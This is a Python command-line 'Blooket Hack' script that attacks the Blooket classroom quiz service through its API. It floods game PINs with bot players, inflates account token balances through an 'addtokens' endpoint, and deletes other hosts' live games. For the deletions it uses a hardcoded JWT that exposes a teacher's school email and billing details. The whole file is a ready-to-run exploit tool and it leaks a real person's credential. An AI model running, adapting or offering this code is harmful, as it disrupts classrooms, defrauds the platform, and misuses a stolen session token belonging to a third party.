import requests

def addPlayer():
        gamePin = input("Enter game pin: ")
        name = input("Enter name: ")
        times = input("How many players would you like to add (max 50)? ")
        times = int(times)
        instance = 1
        url = 'https://api.blooket.com:443/api/firebase/join'

        headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0', 
                'Accept': 'application/json, text/plain, */*', 
                'Accept-Language': 'en-GB,en;q=0.5', 
                'Accept-Encoding': 'gzip, deflate', 
                'Content-Type': 'application/json;charset=utf-8', 
                'Content-Length': '32', 
                'Origin': 'https://www.blooket.com', 
                'Referer': 'https://www.blooket.com/', 
                'Te': 'trailers', 
                'Connection': 'close'    
        }

        for i in range(times):
                body = '{"id":"' + gamePin + '","name":"' + name + "-" + str(instance) + '"}'
                instance +=1
                x = requests.put(url, data = body, headers = headers)
        print("")
        print("Added " + str(times) + " players.")
        selector()

def addTokens():
        email = input("Email: ")
        password = input("Password: ")
        tokens = input("Enter amount of tokens: ")
        
        url = 'https://api.blooket.com:443/api/users/login'
        headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0', 
                'Accept': 'application/json, text/plain, */*', 
                'Accept-Language': 'en-GB,en;q=0.5', 
                'Accept-Encoding': 'gzip, deflate', 
                'Authorization': '', 
                'Content-Type': 'application/json;charset=utf-8', 
                'Content-Length': '67', 
                'Origin': 'https://www.blooket.com', 
                'Referer': 'https://www.blooket.com/', 
                'Te': 'trailers', 
                'Connection': 'close'     
        }

        body = '{"name":"' + str(email) + '","password":"' + str(password) + '"}'

        x = requests.post(url, data = body, headers = headers)
        jsonResponse = x.json()
        authorization = jsonResponse['token']
        jsonResponse = jsonResponse['user']
        name = jsonResponse['name']



        url = 'https://api.blooket.com:443/api/users/addtokens'
        headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0', 
                'Accept': 'application/json, text/plain, */*', 
                'Accept-Language': 'en-GB,en;q=0.5', 
                'Accept-Encoding': 'gzip, deflate', 
                'Authorization': str(authorization), 
                'Content-Type': 'application/json;charset=utf-8', 
                'Content-Length': '43', 
                'Origin': 'https://www.blooket.com', 
                'Referer': 'https://www.blooket.com/', 
                'Te': 'trailers', 
                'Connection': 'close'     
        }

        body = '{"name":"' + str(name) + '","addedTokens":' + str(tokens) + '}'
        x = requests.put(url, data = body, headers = headers)
        print("")
        print("Added " + str(tokens) + " tokens to " + str(name))
        selector()

def kick():
        gamePin = input("Enter game pin: ")
        
        url = 'https://api.blooket.com:443/api/firebase/host?id=' + str(gamePin)
        headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0', 
                'Accept': 'application/json, text/plain, */*', 
                'Accept-Language': 'en-GB,en;q=0.5', 
                'Accept-Encoding': 'gzip, deflate', 
                'Authorization': 'JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoicm9zZWJsYWNrcGluazY5Iiwic3RyaXBlIjoiY3VzX0pLWWpRcmVsa0Q3allsIiwicGxhbiI6IlN0YXJ0ZXIiLCJnYW1lc1BsYXllZCI6NDAsImVtYWlsIjoiZ2lkZW9uLmR5a2VAbWlsbGJ1cm5hY2FkZW15Lm9yZy51ayIsImRhdGVDcmVhdGVkIjoiMjAyMS0wNC0xOVQwOTo0MTo1My41MThaIiwicm9sZSI6IlRlYWNoZXIiLCJoYXNQYXNzd29yZCI6dHJ1ZSwiZXhwIjoxNjIyMzEyODc2LCJpYXQiOjE2MjE3MDcyNDd9.u3Cn7jCcmSBQ6nGDjXVHS5pBJKydlIfzriZDSm0xM94', 
                'Origin': 'https://www.blooket.com', 
                'Referer': 'https://www.blooket.com/', 
                'Te': 'trailers', 
                'Connection': 'close'         
        }

        x = requests.delete(url, headers = headers)
        print("")
        print("Deleted game " + str(gamePin))

def selector():
        print("")
        print("")
        print("Hacks:")
        print("0. Exit")
        print("1. Blooket Bots")
        print("2. Token Hack")
        print("3. Delete Game")
        print("")
        option = input("What option would you like? ")
        if option == '1':
                addPlayer()
        if option == '2':
                addTokens()
        if option == '3':
                kick()
        else:
                print("Exiting.")
                

print("                                                               ")
print("                                                               ")
print("██████  ██       ██████   ██████  ██   ██ ███████ ████████     ")
print("██   ██ ██      ██    ██ ██    ██ ██  ██  ██         ██        ")
print("██████  ██      ██    ██ ██    ██ █████   █████      ██        ")
print("██   ██ ██      ██    ██ ██    ██ ██  ██  ██         ██        ")
print("██████  ███████  ██████   ██████  ██   ██ ███████    ██        ")
print("                                                               ")
print("            ██   ██  █████   ██████ ██   ██                    ")
print("            ██   ██ ██   ██ ██      ██  ██                     ")
print("            ███████ ███████ ██      █████                      ")
print("            ██   ██ ██   ██ ██      ██  ██                     ")
print("            ██   ██ ██   ██  ██████ ██   ██                    ")
print("Made by gidbot")

selector()